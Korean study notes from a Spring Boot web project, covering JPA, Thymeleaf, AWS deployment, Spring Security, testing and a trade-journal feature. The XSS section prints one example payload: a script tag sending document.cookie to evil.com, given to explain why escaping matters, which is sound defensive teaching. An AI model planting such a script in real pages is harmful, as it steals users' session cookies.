# Study Notes

프로젝트를 진행하며 학습한 핵심 개념 정리.  
각 Phase의 "왜(Why)"와 "어떻게(How)"를 중심으로 기록한다.

---

## Phase 1 — Server Setup

### Step 1. Spring Boot 초기화

#### Spring Boot란?
Spring Framework 위에서 동작하는 **설정 자동화 프레임워크**.  
기존 Spring은 XML 설정, 의존성 관리 등 초기 설정이 복잡했으나,  
Spring Boot는 **Auto Configuration**으로 대부분을 자동 처리한다.

#### Maven이란?
프로젝트의 **빌드 · 의존성 · 생명주기**를 관리하는 도구.  
`pom.xml`에 필요한 라이브러리를 선언하면 자동으로 다운로드하고 관리해준다.

```
소스코드 → (Maven) → .class 파일 → .jar 파일 → 실행
```

#### JAR vs WAR
| 방식 | 설명 | 용도 |
| :--- | :--- | :--- |
| JAR | 내장 톰캣 포함, 단독 실행 가능 | Spring Boot 기본 권장 방식 |
| WAR | 외부 WAS(톰캣 등)에 배포 | 레거시 엔터프라이즈 환경 |

→ Spring Boot는 JAR 방식으로 `java -jar` 한 줄로 실행된다.

<br>

---

### Step 2. DB Engineering (H2 + JPA)

#### ORM이란?
**Object-Relational Mapping** — Java 객체와 DB 테이블을 자동으로 연결해주는 기술.  
SQL을 직접 작성하지 않고, Java 코드로 DB를 조작할 수 있다.

```java
// SQL 없이 Java 코드로 저장
postRepository.save(post);

// SQL 없이 Java 코드로 조회
postRepository.findById(id);
```

#### JPA vs Hibernate
| 개념 | 설명 |
| :--- | :--- |
| JPA | ORM의 **표준 인터페이스** (스펙) |
| Hibernate | JPA의 **구현체** (실제 동작) |
| Spring Data JPA | JPA를 더 쉽게 쓸 수 있도록 Spring이 감싼 것 |

→ 우리가 쓰는 건 Spring Data JPA. 내부적으로 Hibernate가 동작한다.

#### `@Entity`와 테이블 매핑
```java
@Entity
@Table(name = "posts")
public class Post {
    @Id
    @GeneratedValue(strategy = GenerationType.IDENTITY)
    private Long id;
}
```
- `@Entity` : 이 클래스가 DB 테이블과 매핑됨을 선언
- `@Id` : 기본키(PK) 지정
- `GenerationType.IDENTITY` : DB의 AUTO_INCREMENT 방식 사용

#### `ddl-auto` 옵션
| 옵션 | 동작 |
| :--- | :--- |
| `create` | 시작 시 테이블 DROP 후 새로 CREATE |
| `update` | 변경된 부분만 ALTER (데이터 유지) |
| `validate` | 엔터티와 테이블 구조 일치 여부만 검사 |
| `none` | 아무것도 하지 않음 |

→ 개발: `update`, 운영: `none` (직접 마이그레이션 관리)

#### H2 vs MySQL
| 항목 | H2 | MySQL |
| :--- | :--- | :--- |
| 방식 | 인메모리 / 파일 기반 경량 DB | 독립 프로세스 RDBMS |
| 용도 | 로컬 개발, 테스트 | 실제 서비스 운영 |
| 장점 | 설정 제로, 빠른 시작 | 안정성, 동시 접속, 대용량 |

<br>

---

### Step 3. UI/UX Engineering (Thymeleaf)

#### 서버 사이드 렌더링(SSR) vs 클라이언트 사이드 렌더링(CSR)
| 방식 | 동작 | 예시 |
| :--- | :--- | :--- |
| SSR | 서버에서 HTML을 완성해서 전달 | Thymeleaf, JSP |
| CSR | 브라우저가 JS로 HTML을 생성 | React, Vue |

→ 이 프로젝트는 SSR 방식. Spring MVC 흐름 이해에 집중.

#### Thymeleaf 핵심 문법
```html
<!-- 데이터 출력 -->
<span th:text="${post.title}"></span>

<!-- 반복 -->
<tr th:each="post : ${posts}">

<!-- 조건 -->
<div th:if="${#authorization.expression('isAuthenticated()')}">

<!-- URL 생성 -->
<a th:href="@{/post/detail/{id}(id=${post.id})}">
```

#### Spring MVC 요청 흐름
```
HTTP 요청
    ↓
DispatcherServlet (Front Controller)
    ↓
HandlerMapping → 해당 Controller 탐색
    ↓
Controller → Model에 데이터 담아 View 이름 반환
    ↓
ViewResolver → templates/{view}.html 탐색
    ↓
Thymeleaf → HTML 완성
    ↓
HTTP 응답
```

<br>

---

### Step 4. System Management (AWS EC2)

#### 클라우드 서버란?
물리 서버를 직접 구매하는 대신, AWS가 보유한 서버를 **필요한 만큼 빌려 쓰는** 방식.

#### EC2 핵심 개념
| 개념 | 설명 |
| :--- | :--- |
| AMI | 서버 OS 이미지 (Amazon Linux 2023 사용) |
| 인스턴스 타입 | 서버 사양 (t3.micro = 프리 티어) |
| Elastic IP | 재시작 해도 변하지 않는 고정 퍼블릭 IP |
| 보안 그룹 | 방화벽 역할 — 포트별 접근 허용/차단 |
| Key Pair (.pem) | SSH 접속에 쓰는 비대칭 키 파일 |

#### SCP로 파일 전송하는 이유
EC2 서버는 직접 접근할 수 없으므로 SSH 프로토콜 기반의 SCP로 파일을 복사한다.

```bash
# 로컬 → 서버 파일 복사
scp -i [key.pem] [로컬파일] ec2-user@[서버IP]:~/
```

<br>

---

### Step 5. Security Engineering (Nginx + HTTPS)

#### Nginx가 필요한 이유 (리버스 프록시)
Spring Boot가 8080 포트에서 동작할 때, 사용자는 80(HTTP) / 443(HTTPS) 포트로 접근한다.  
Nginx가 중간에서 요청을 받아 8080으로 전달하는 **리버스 프록시** 역할을 한다.

```
사용자 → :443 (Nginx) → :8080 (Spring Boot)
```

#### HTTPS가 필요한 이유
HTTP는 데이터를 평문으로 전송 → 중간에서 탈취(도청) 가능.  
HTTPS는 TLS로 암호화 → 데이터 도청 · 위변조 방지.

#### Let's Encrypt란?
무료 SSL 인증서를 발급해주는 비영리 기관.  
`certbot`이 자동으로 인증서를 발급하고 Nginx 설정까지 수정해준다.  
인증서 유효기간은 90일 — `certbot renew`로 자동 갱신.

<br>

---

## Phase 2 — Maintenance & Operation

### Step 1-1. Layered Architecture (계층형 아키텍처)

#### 왜 계층을 나누는가?
**관심사 분리(Separation of Concerns)** 원칙.  
하나의 클래스가 HTTP 처리 + 비즈니스 로직 + DB 접근을 모두 담당하면,  
기능 변경 시 연쇄적으로 코드가 수정되어 유지보수가 어려워진다.

```
Controller   : HTTP 요청/응답 처리만
Service      : 비즈니스 로직만
Repository   : DB 접근만
```

#### Service 인터페이스를 분리하는 이유
```java
public interface PostService { ... }
public class PostServiceImpl implements PostService { ... }
```
- Controller가 구현체(`PostServiceImpl`)가 아닌 인터페이스(`PostService`)에 의존
- 구현체를 교체해도 Controller 코드를 수정할 필요가 없음
- 테스트 시 Mock 객체로 쉽게 교체 가능

#### `@Transactional`이란?
DB 작업의 **원자성(Atomicity)** 보장.  
메서드 안의 모든 DB 작업이 하나의 단위로 묶임 — 중간에 실패하면 전체 롤백.

```java
@Transactional
public void save(Post post) {
    // 이 안의 작업이 모두 성공해야 커밋
    // 하나라도 실패하면 전체 롤백
}
```

`readOnly = true` : 조회 전용 트랜잭션. 불필요한 스냅샷 저장을 생략해 성능 향상.

<br>

---

### Step 1-2. Validation & Exception Handling

#### Bean Validation이란?
어노테이션으로 입력값 검증을 선언적으로 처리.

```java
@NotBlank(message = "제목은 비워둘 수 없습니다.")
@Size(max = 100)
private String title;
```

`@Valid`를 Controller 파라미터에 붙이면 Spring이 자동으로 검증 후,  
실패 시 `BindingResult`에 에러를 담아준다.

#### `@ControllerAdvice`로 전역 예외 처리
```
예외 발생 → @ExceptionHandler → 적절한 응답/페이지 반환
```
각 Controller마다 try-catch를 작성하는 대신,  
`GlobalExceptionHandler` 한 곳에서 모든 예외를 처리.

<br>

---

### Step 1-3. Unit Testing (Mockito)

#### 단위 테스트 vs 통합 테스트
| 종류 | 범위 | 속도 | 목적 |
| :--- | :--- | :--- | :--- |
| 단위 테스트 | 클래스 하나 | 빠름 | 비즈니스 로직 검증 |
| 통합 테스트 | 여러 계층 + DB | 느림 | 전체 흐름 검증 |

#### Mockito란?
테스트 대상 외의 의존성을 **가짜 객체(Mock)**로 대체하는 라이브러리.

```java
@Mock PostRepository postRepository;   // 가짜 Repository
@InjectMocks PostServiceImpl service;  // 진짜 Service에 Mock 주입
```

`given(...).willReturn(...)` 으로 Mock의 동작을 미리 지정.  
실제 DB 없이도 Service 로직만 빠르게 검증할 수 있다.

#### BDD 스타일 테스트 구조
```java
// given : 사전 조건 설정
given(postRepository.findById(1L)).willReturn(Optional.of(post));

// when : 실제 실행
Post result = service.findById(1L);

// then : 결과 검증
assertEquals("제목", result.getTitle());
verify(postRepository).findById(1L);
```

<br>

---

### Step 1-4. Pagination & Search

#### 왜 페이지네이션이 필요한가?
게시글이 수천 개라면 한 번에 전부 조회 시 메모리 낭비 + 응답 속도 저하.  
`Pageable`로 필요한 페이지만 잘라서 가져온다.

#### Spring Data JPA Query Methods
메서드 이름 규칙으로 SQL 없이 쿼리를 자동 생성하는 기능.

```java
// → WHERE title LIKE '%keyword%' OR content LIKE '%keyword%'
Page<Post> findByTitleContainingOrContentContaining(
    String title, String content, Pageable pageable
);
```

<br>

---

### Step 1-5. File Upload

#### UUID란?
**Universally Unique Identifier** — 128비트 고유 식별자.  
파일 업로드 시 원본 파일명 그대로 저장하면 동명 파일 충돌 발생.  
UUID를 prefix로 붙여 파일명을 고유하게 만든다.

```
원본: photo.jpg
저장: 550e8400-e29b-41d4-a716-446655440000_photo.jpg
```

#### Resource Handler가 필요한 이유
Spring Boot는 기본적으로 `src/main/resources/static/` 의 파일만 웹으로 제공.  
`./uploads/` 같은 외부 경로는 `WebMvcConfigurer`로 별도 매핑이 필요하다.

```java
registry.addResourceHandler("/uploads/**")
        .addResourceLocations(uploadPath.toURI().toString());
```

<br>

---

### Step 1-6. Profile (환경 분리)

#### Spring Profile이란?
동일한 코드베이스에서 **환경별로 다른 설정**을 적용하는 메커니즘.

```
application.properties          (공통)
application-local.properties    (local 프로필 활성화 시 추가 적용)
application-prod.properties     (prod 프로필 활성화 시 추가 적용)
```

공통 설정 위에 프로필 설정이 **덮어씌워지는** 방식으로 동작.

<br>

---

### Step 2. Database Migration (H2 → MySQL)

#### AWS RDS란?
AWS가 운영하는 **완전 관리형 DB 서비스**.  
백업, 패치, 복구를 AWS가 자동으로 처리해준다.

#### 환경변수로 민감정보 관리
DB 비밀번호 같은 민감정보를 코드에 직접 작성하면 GitHub에 노출될 위험이 있다.

```properties
# application-prod.properties
spring.datasource.url=${DATABASE_URL}
spring.datasource.password=${DATABASE_PASSWORD}
```

`${...}` 형식으로 환경변수 또는 `.env` 파일에서 값을 읽는다.

<br>

---

### Step 3. Spring Security (인증 / 인가)

#### Authentication vs Authorization
| 개념 | 질문 | 예시 |
| :--- | :--- | :--- |
| Authentication (인증) | 너 누구야? | 로그인 |
| Authorization (인가) | 너 뭘 할 수 있어? | 관리자만 접근 가능 |

#### Spring Security 동작 흐름
```
HTTP 요청
    ↓
Security Filter Chain
    ↓
인증 확인 → 미인증 시 로그인 페이지로 리다이렉트
    ↓
인가 확인 → 권한 없으면 403
    ↓
Controller
```

#### `UserDetails`를 직접 구현하는 이유
Spring Security는 내부적으로 `UserDetails` 인터페이스로 사용자 정보를 다룬다.  
`User` 엔터티가 `UserDetails`를 구현하면 Spring Security가 직접 인식할 수 있다.

#### BCrypt란?
비밀번호 해시 알고리즘. **단방향 암호화** — 복호화 불가.  
같은 비밀번호도 매번 다른 해시값 생성 (Salt 자동 적용).

```java
// 저장 시
String encoded = bCryptPasswordEncoder.encode(rawPassword);

// 검증 시
bCryptPasswordEncoder.matches(rawPassword, encoded); // true/false
```

#### 세션 기반 인증 흐름
```
로그인 요청
    ↓
Spring Security가 DB에서 사용자 조회 (UserDetailsService)
    ↓
비밀번호 검증 (BCrypt.matches)
    ↓
성공 → 서버에 세션 생성, 클라이언트에 JSESSIONID 쿠키 전달
    ↓
이후 요청마다 쿠키로 세션 조회 → 인증 상태 유지
```

<br>

---

### Step 4. Infrastructure Maintenance

#### Logback이란?
Spring Boot 기본 로그 라이브러리.  
`logback-spring.xml`로 세부 설정을 제어한다.

#### 로그 레벨
```
TRACE < DEBUG < INFO < WARN < ERROR
```

| 레벨 | 용도 |
| :--- | :--- |
| DEBUG | 개발 중 상세 흐름 확인 |
| INFO | 정상 동작 기록 (서비스 시작, 주요 이벤트) |
| WARN | 즉각 오류는 아니지만 주의가 필요한 상황 |
| ERROR | 즉시 확인이 필요한 오류 |

#### 롤링 정책(Rolling Policy)이란?
로그를 한 파일에 계속 쌓으면 파일이 무한정 커진다.  
`TimeBasedRollingPolicy`로 날짜별로 파일을 분리하고, 오래된 파일을 자동 삭제.

```
logs/info.log          ← 오늘 로그
logs/info.2025-06-14.log  ← 어제 로그 (30일 후 자동 삭제)
```

#### CI/CD란?
| 개념 | 설명 |
| :--- | :--- |
| CI (Continuous Integration) | 코드 변경 시 자동으로 빌드 · 테스트 |
| CD (Continuous Deployment) | 빌드 성공 시 자동으로 서버에 배포 |

→ 개발자가 `git push`만 하면 나머지는 자동화.

#### GitHub Actions 동작 구조
```yaml
on: push           # 트리거 : push 이벤트 발생 시
jobs:
  deploy:
    steps:
      - checkout   # 소스코드 받기
      - build      # Maven 빌드
      - scp        # 서버로 전송
      - ssh        # 서버에서 재시작
```

#### systemd란?
Linux의 **서비스 관리 시스템**.  
`nohup`으로 실행하면 서버 재부팅 시 앱이 꺼지지만,  
systemd에 등록하면 **재부팅 시 자동 시작 + 비정상 종료 시 자동 재시작**.

```bash
sudo systemctl enable my-server   # 부팅 시 자동 시작 등록
sudo systemctl restart my-server  # 재시작
sudo journalctl -u my-server -f   # 실시간 로그 확인
```

| 방식 | 재부팅 후 자동 시작 | 비정상 종료 시 재시작 |
| :--- | :---: | :---: |
| nohup | ❌ | ❌ |
| systemd | ✅ | ✅ |

<br>

---

## Phase 3 — Security Hardening

### Step 1. Service 레이어 권한 검증

#### View 보안 vs Server 보안

보안은 **서버(백엔드)에서 반드시 검증**해야 한다.  
View(HTML)에서 버튼을 숨기는 것은 화면 처리일 뿐, 실제 보안이 아니다.

```
❌ 잘못된 구조
사용자 A가 /post/delete/1 URL 직접 입력
→ 서버가 아무 검증 없이 삭제 실행

✅ 올바른 구조
사용자 A가 /post/delete/1 URL 직접 입력
→ 서버가 "A가 글 1의 작성자인가?" 검증
→ 아니면 403 반환
```

#### 왜 Service 레이어에서 검증하는가?

Controller는 요청을 받아서 Service로 넘기는 역할만 한다.  
**비즈니스 규칙("작성자만 수정/삭제 가능")은 Service 레이어의 책임**이다.  
Controller에서 검증하면 API 엔드포인트가 추가될 때마다 중복 검증 코드가 생긴다.

#### 구현 패턴

```java
private void validateOwner(Post post) {
    String currentLoginId = getCurrentLoginId();   // 현재 로그인한 사용자
    boolean isAdmin = currentUser.getRole() == Role.ADMIN;
    boolean isOwner = post.getUser().getLoginId().equals(currentLoginId);

    if (!isAdmin && !isOwner)
        throw new UnauthorizedException("권한이 없습니다.");
}
```

- `ADMIN`은 모든 글을 수정/삭제 가능
- `USER`는 본인 글만 가능
- 권한 없으면 `UnauthorizedException` → `GlobalExceptionHandler` → 403 페이지

#### Controller는 인터페이스에 의존해야 하는 이유

```java
// ❌ 구현체에 직접 의존
private final PostServiceImpl postServiceImpl;

// ✅ 인터페이스에 의존
private final PostService postService;
```

구현체를 바꿔도 Controller 코드를 수정할 필요가 없다.  
테스트 시 Mock 객체로 쉽게 교체할 수 있다.

<br>

---

### Step 2. Rate Limiting · XSS / CSRF 방어

#### Rate Limiting (브루트포스 방어)란?

**브루트포스 공격** : 비밀번호를 맞출 때까지 수천 번 자동으로 로그인을 시도하는 공격.  
**Rate Limiting** : 짧은 시간 내 과도한 요청을 차단하는 기법.

```
로그인 실패 5회 이상 (같은 IP)
    ↓
LoginAttemptService 가 해당 IP를 15분간 차단
    ↓
차단된 IP의 로그인 시도 → "너무 많은 시도" 메시지 반환
```

이 프로젝트에서는 외부 라이브러리 없이 `ConcurrentHashMap`으로 구현.  
`ConcurrentHashMap` : 멀티스레드 환경에서 안전한 HashMap.

#### CSRF란?

**Cross-Site Request Forgery** — 사용자가 의도하지 않은 요청을 다른 사이트에서 강제로 실행시키는 공격.

```
1. 사용자가 우리 서비스에 로그인 (세션 유지 중)
2. 공격자가 만든 악성 페이지 접속
3. 악성 페이지가 몰래 우리 서버로 POST 요청 전송
4. 서버는 세션만 보고 정상 요청으로 처리 → 피해 발생
```

**CSRF 토큰으로 방어**

```
서버가 폼에 고유 토큰을 심어둠
    ↓
사용자가 폼 제출 시 토큰도 함께 전송
    ↓
서버가 토큰 일치 여부 확인
    ↓
악성 사이트는 토큰을 모르므로 요청 차단
```

Spring Security + Thymeleaf : `th:action` 폼에 CSRF 토큰 자동 삽입.

#### XSS란?

**Cross-Site Scripting** — 악성 스크립트를 게시글 등에 삽입하여 다른 사용자 브라우저에서 실행시키는 공격.

```html
<!-- 공격자가 게시글 내용으로 입력 -->
<script>document.location='https://evil.com?cookie='+document.cookie</script>

<!-- 방어 미흡 시 다른 사람이 글을 보면 스크립트 실행 → 쿠키(세션) 탈취 -->
```

Thymeleaf `th:text`는 자동으로 HTML 이스케이프 처리하여 스크립트 실행 차단.

#### 보안 헤더란?

HTTP 응답 헤더에 브라우저에게 보안 정책을 지시하는 값.

| 헤더 | 방어 대상 |
| :--- | :--- |
| `X-Content-Type-Options: nosniff` | MIME 타입 스니핑 공격 |
| `frameOptions: sameOrigin` | 클릭재킹 (다른 사이트 iframe에 내 사이트 삽입) |
| `Referrer-Policy: same-origin` | URL 정보 외부 유출 |

<br>

---

## Phase 3 Step 3 — 민감정보 외부화

### 왜 중요한가

DB 비밀번호 같은 민감정보가 코드나 파일에 있으면 서버 접근권한 탈취 시 바로 노출된다.  
단계별 보안 수준을 비교하면:

| 방식 | 위험도 | 이유 |
| :--- | :---: | :--- |
| 코드에 하드코딩 | ❌ 매우 위험 | GitHub push 시 전 세계 노출 |
| `.env` 파일 | 🔺 위험 | 파일 읽기 권한만 있으면 탈취 가능 |
| systemd `Environment=` | ✅ 안전 | root만 읽을 수 있는 서비스 파일에 저장 |
| AWS Secrets Manager | ✅✅ 최상 | 런타임 API 호출, 자격증명 자동 순환 |

### 구현 방식

#### 1. Spring Boot 측 — `.env` 파일 import 제거

```properties
# application-prod.properties에서 이 줄 제거
spring.config.import=optional:file:.env[.properties]
```

`${DATABASE_URL}` 같은 환경변수 참조 구문은 그대로 유지.  
Spring Boot는 시스템 환경변수를 자동으로 읽기 때문에 별도 import가 필요 없다.

#### 2. systemd 서비스 파일에 환경변수 주입

```ini
[Service]
Environment=DATABASE_URL=jdbc:mysql://[RDS_ENDPOINT]:3306/[DB_NAME]
Environment=DATABASE_USERNAME=[DB_USERNAME]
Environment=DATABASE_PASSWORD=[DB_PASSWORD]
```

서비스 파일은 root 소유이므로 chmod 600으로 다른 사용자 접근 차단:

```bash
sudo chmod 600 /etc/systemd/system/my-server.service
```

#### 3. 환경변수 주입 흐름

```
systemd 서비스 파일 (root 전용)
        ↓  Environment= 주입
Spring Boot 프로세스 환경변수
        ↓  ${DATABASE_URL} 참조
application-prod.properties
        ↓
DataSource 설정 완료
```

`.env` 파일은 서버에서 완전히 제거해도 된다.

<br>

---

## Phase 3 Step 4 — 컨트롤러 보안 테스트

### `@WebMvcTest` vs `@SpringBootTest`

| 항목 | `@WebMvcTest` | `@SpringBootTest` |
| :--- | :--- | :--- |
| 로드 범위 | 웹 계층만 (Controller, Filter, Security) | 전체 애플리케이션 컨텍스트 |
| 속도 | 빠름 | 느림 |
| DB 필요 | ❌ (Repository 등은 Mock) | ✅ (또는 H2) |
| 사용 목적 | HTTP 요청/응답, 보안 규칙 검증 | 통합 테스트 |

보안 테스트는 "이 URL에 이 인증 상태로 요청하면 어떤 HTTP 응답이 오는가"를 검증하므로 `@WebMvcTest`가 적합하다.

### MockMvc — HTTP 요청을 코드로 시뮬레이션

```java
mockMvc.perform(get("/post/edit/1"))          // GET 요청 보내기
        .andExpect(status().is3xxRedirection()) // 3xx 응답 기대
        .andExpect(redirectedUrl("/user/login")); // 리다이렉트 위치 확인
```

실제 서버 없이 컨트롤러까지의 전체 HTTP 처리 파이프라인(필터, Security, 컨트롤러, 뷰)을 테스트한다.

### 인증 주입 방법

```java
// 요청 단위로 인증 주입 (SecurityMockMvcRequestPostProcessors)
mockMvc.perform(get("/post/edit/1").with(user("testUser").roles("USER")));

// POST + CSRF 토큰 함께 전송
mockMvc.perform(multipart("/post/update/1")
        .file("file", new byte[0])
        .with(user("otherUser").roles("USER"))
        .with(csrf()));
```

`user(...).roles("USER")`는 실제 DB 조회 없이 SecurityContext에 인증 정보를 직접 주입한다.

### `@MockitoBean` — 의존 빈을 가짜로 대체

```java
@MockitoBean
private PostService postService;
```

`@WebMvcTest`는 컨트롤러 레이어만 로드하므로, `PostService` 같은 다른 빈은 가짜(`Mock`)로 교체해야 컨텍스트가 정상 로드된다.

```java
// Mock 동작 정의: 서비스가 UnauthorizedException을 던지도록 설정
doThrow(new UnauthorizedException("권한 없음"))
        .when(postService).delete(anyLong());
```

### `@ControllerAdvice` + `@ResponseStatus`

예외 핸들러에 `@ResponseStatus`가 없으면 뷰를 반환해도 HTTP 상태코드는 200이 된다.  
보안 테스트에서 403을 확인하려면 반드시 명시해야 한다.

```java
@ResponseStatus(HttpStatus.FORBIDDEN)
@ExceptionHandler(UnauthorizedException.class)
public String handleUnauthorizedException(...) { return "error/403"; }
```

<br>

---

## Phase 4 Step 1 — 다크 테마 · 대시보드 레이아웃 전환

### Thymeleaf Fragment로 레이아웃 재사용

```html
<!-- fragments/sidebar.html -->
<div th:fragment="sidebar(activeMenu)" class="app-sidebar"> ... </div>

<!-- list.html -->
<div th:replace="~{fragments/sidebar :: sidebar('dashboard')}"></div>
```

`th:fragment`로 정의한 조각을 `th:replace`로 다른 템플릿에 삽입한다. 파라미터(`activeMenu`)를 전달할 수 있어 페이지마다 어떤 메뉴를 활성 상태로 표시할지 제어 가능하다. 사이드바를 페이지마다 복사하지 않고 한 곳에서 관리한다.

### 정적 리소스도 Spring Security 인가 대상이다

다크 테마 CSS를 추가했는데 화면이 흰 배경으로 그대로 보이는 문제가 발생했다.

**원인** : `SecurityConfig`의 `permitAll()` 목록에 `/css/**`가 빠져 있었음.

```java
.requestMatchers("/", "/main/list/**", "/user/**", "/uploads/**", "/h2-console/**")
        .permitAll()
.anyRequest().authenticated()   // /css/** 도 여기 걸림
```

비로그인 상태로 `/css/dark-theme.css`를 요청하면 Spring Security가 이를 인증이 필요한 리소스로 판단해 `/user/login`으로 302 리다이렉트한다. 브라우저는 CSS 대신 로그인 페이지 HTML을 받게 되어 스타일이 전혀 적용되지 않는다.

**해결** : CSS/JS 등 정적 리소스 경로를 `permitAll()`에 명시적으로 추가.

```java
.requestMatchers("/", "/main/list/**", "/user/**", "/uploads/**",
        "/h2-console/**", "/css/**", "/js/**").permitAll()
```

HTML 페이지가 정상 로드되어도 그 안에서 참조하는 CSS/JS/이미지 등 모든 리소스는 별도의 HTTP 요청이며, 각각 Security 인가 규칙을 통과해야 한다는 점을 기억해야 한다.

### CSS Grid `auto-fit`으로 반응형 카드 레이아웃

```css
.kpi-grid {
    grid-template-columns: repeat(auto-fit, minmax(140px, 1fr));
}
```

고정 컬럼 수(`repeat(4, ...)`) 대신 `auto-fit`을 쓰면 컨테이너 폭에 따라 컬럼 수가 자동으로 줄어든다. 향후 우측에 분할 패널이 열려 메인 영역이 좁아져도 별도의 JS 없이 카드가 자연스럽게 줄바꿈된다.

<br>

---

## Phase 4 Step 2 — 콘텐츠 타입 분리 (TRADE_LOG / INSIGHT)

### 단일 테이블 + Enum 컬럼 전략

매매일지와 인사이트를 별도 테이블로 나누지 않고 `Post` 테이블 하나에 `type` 컬럼(Enum)으로 구분했다.

```java
@Enumerated(EnumType.STRING)
private PostType type = PostType.INSIGHT;

private String ticker;          // TRADE_LOG일 때만 값이 채워짐
private TradePosition position;
private BigDecimal entryPrice;
```

테이블을 분리했다면 목록 조회 시 두 테이블을 UNION 해야 하고, 댓글·권한·공개설정 같은 공통 기능을 양쪽에 중복 구현해야 한다. 단일 테이블 + 타입 컬럼은 공통 로직을 그대로 재사용하면서 타입별 전용 필드만 nullable로 추가하면 된다. 데이터가 매우 커지거나 필드 구조가 완전히 달라지는 시점이 오면 분리를 재검토한다.

### Spring Data JPA의 And/Or 우선순위

```java
Page<Post> findByTypeAndTitleContainingOrTypeAndContentContaining(
        PostType type1, String title, PostType type2, String content, Pageable pageable);
```

메서드 이름만 보면 `Type AND Title OR Type AND Content`인데, Spring Data JPA는 `And`가 `Or`보다 결합력이 강하다고 해석한다. 즉 `(Type AND Title) OR (Type AND Content)`로 파싱되어, "해당 타입이면서 제목 또는 내용에 키워드가 포함된 글"이라는 의도한 쿼리가 정확히 만들어진다. 파라미터로 `type`을 두 번 전달해야 하는 이유도 이 구조 때문이다.

### `@RequestParam`의 Enum 자동 변환

```java
@RequestParam(value = "type", required = false) PostType type
```

Spring MVC는 쿼리 파라미터 문자열(`?type=TRADE_LOG`)을 `Enum.valueOf()`로 자동 변환해 컨트롤러 파라미터에 바인딩한다. 별도의 변환 코드 없이 `String` 대신 enum 타입을 그대로 받을 수 있다. 단, 존재하지 않는 값(`?type=BOGUS`)을 넘기면 변환 실패로 예외가 발생한다 — 사용자 입력을 직접 받는 파라미터라면 잘못된 값에 대한 처리(400 응답 등)를 별도로 고려해야 한다.

### Thymeleaf 조건부 클래스 적용

```html
<a th:href="@{/main/list(type='TRADE_LOG')}"
   class="filter-chip"
   th:classappend="${type != null and type.name() == 'TRADE_LOG'} ? ' active' : ''">매매일지</a>
```

`th:classappend`는 기존 `class` 속성 값에 조건부로 문자열을 덧붙인다. 현재 선택된 필터를 시각적으로 강조하는 데 쓰였다.

<br>

---

## Phase 4 — 전체 화면 다크 테마 통일 + 대시보드 차트 틀

### 화면 간 일관성을 CSS 클래스로 관리

로그인, 회원가입, 글쓰기, 수정, 상세, 에러 페이지(403/404/500)가 모두 제각각 Bootstrap 기본 스타일을 쓰고 있었다. 페이지마다 인라인 스타일을 새로 작성하는 대신 `dark-theme.css`에 의미 단위 클래스를 정의하고 재사용했다.

```css
.auth-card { /* 로그인/회원가입 카드 */ }
.error-shell { /* 403/404/500 공통 레이아웃 */ }
.form-page-card { /* 글쓰기/수정 폼 카드 */ }
.detail-card, .detail-stat { /* 상세 페이지 */ }
```

이렇게 하면 추후 색상 하나를 바꿔도 `:root`의 CSS 변수만 수정하면 전체 화면에 일괄 반영된다.

### 비어 있는 영역도 "틀"부터 만드는 이유

대시보드의 메인 차트·워치리스트·미니 차트 그리드는 아직 실제 시세 데이터가 없다. 그렇다고 해당 영역을 비워두지 않고, 정적 SVG와 더미 텍스트("데이터 연동 예정")로 레이아웃 틀을 먼저 만들었다.

```html
<div th:if="${type == null}" class="chart-panel">
    ...
</div>
```

`th:if="${type == null}"`로 감싸서 대시보드(전체) 화면에서만 보이고, "매매일지"/"인사이트" 필터 화면에서는 숨겨지도록 분리했다. 나중에 실제 통계 데이터를 연동할 때(Phase 4 Step 6) 이 틀 안의 SVG `points`만 실제 값으로 교체하면 되므로, 화면 구조와 데이터 연동을 분리해서 작업할 수 있다.

### Controller에서 activeMenu를 일관되게 계산

```java
private String activeMenuFor(PostType type)
{
    if (type == null) return "dashboard";
    return type == PostType.TRADE_LOG ? "tradelog" : "insight";
}
```

목록/상세/글쓰기/수정 등 여러 메서드에서 사이드바 활성 메뉴를 계산하는 로직이 똑같이 필요했다. 메서드로 추출해서 중복을 제거하고, `Post.type`이 있는 곳이면 어디서든 같은 기준으로 사이드바가 강조된다.

<br>

---

## Phase 4 Step 3 — 매매일지 CRUD

### 사용자가 입력한 값을 그대로 믿지 않는다

처음에는 수익률(%)도 사용자가 직접 입력하는 필드였다. 하지만 진입가·청산가를 입력했는데 수익률을 잘못 계산해서 입력하면 데이터가 깨진다. 그래서 수익률 입력 필드를 폼에서 완전히 제거하고, 서버에서 진입가/청산가/포지션으로부터 자동 계산하도록 바꿨다.

```java
private void calculateProfitRate(Post post)
{
    if (post.getType() != PostType.TRADE_LOG
            || post.getEntryPrice() == null
            || post.getExitPrice() == null
            || post.getEntryPrice().signum() == 0)
    {
        post.setProfitRate(null);
        return;
    }

    BigDecimal rate = post.getExitPrice().subtract(post.getEntryPrice())
            .divide(post.getEntryPrice(), 4, RoundingMode.HALF_UP)
            .multiply(BigDecimal.valueOf(100))
            .setScale(2, RoundingMode.HALF_UP);

    if (post.getPosition() == TradePosition.SHORT)
    { rate = rate.negate(); }

    post.setProfitRate(rate);
}
```

핵심은 **SHORT 포지션의 방향 반전**이다. SHORT는 가격이 떨어질 때 이익을 보는 포지션이므로, 단순히 `(청산가-진입가)/진입가`만 계산하면 SHORT에서는 부호가 거꾸로 나온다. 포지션에 따라 부호를 반전시켜야 실제 손익 방향과 일치한다.

```
LONG  : 1000 → 1100  =>  +10%  (가격 상승 = 수익)
SHORT : 1000 → 900   =>  +10%  (가격 하락 = 수익, 부호 반전)
```

`BigDecimal.divide()`는 나누어떨어지지 않으면 `ArithmeticException`을 던지므로, 반드시 소수점 자릿수(`scale`)와 반올림 모드(`RoundingMode`)를 함께 지정해야 한다.

### `BindingResult.rejectValue()`로 필드별 검증 에러 추가

`@Valid`는 `Post` 엔티티에 붙은 `@NotBlank` 같은 어노테이션만 검증한다. "매매일지 타입일 때만 종목이 필수"처럼 조건에 따라 달라지는 규칙은 어노테이션으로 표현하기 어려워서, 컨트롤러에서 직접 검증하고 `BindingResult`에 에러를 추가했다.

```java
if (!StringUtils.hasText(post.getTicker()))
    bindingResult.rejectValue("ticker", "required", "종목을 입력하세요.");
```

`rejectValue("필드명", "에러코드", "메시지")`로 추가한 에러는 `th:errors="*{ticker}"`로 폼에서 그대로 출력된다. `@Valid` 검증과 수동 검증을 같은 `BindingResult`에 누적시켜 한 번에 처리할 수 있다.

---

## Phase 4 — Step 3.5 푸시 패널 분할 레이아웃

### 왜 패널(push-panel) 방식인가

